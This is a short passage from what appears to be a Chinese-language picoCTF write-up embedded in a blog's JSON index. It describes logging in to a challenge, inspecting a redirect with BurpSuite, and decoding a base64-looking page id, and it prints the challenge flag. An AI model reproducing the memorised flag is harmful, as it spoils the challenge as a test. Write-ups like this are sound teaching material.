Additional details will be available after launching your challenge instance. 先用test test!登入 進去後他說I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-) 用BurpSuite查看被redirected的頁面id看起來很像經典base64 picoCTF{proxies_all_the_way_be716d8e}","link":"/2023/05/29/picoCTF-writeup/"}],"tags":[{"name":"writeup","slug":"writeup","link":"/tags/writeup/"},{"name":"notes, cheatsheet","slug":"notes-cheatsheet","link":"/tags/notes-cheatsheet/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"}],"pages":[]}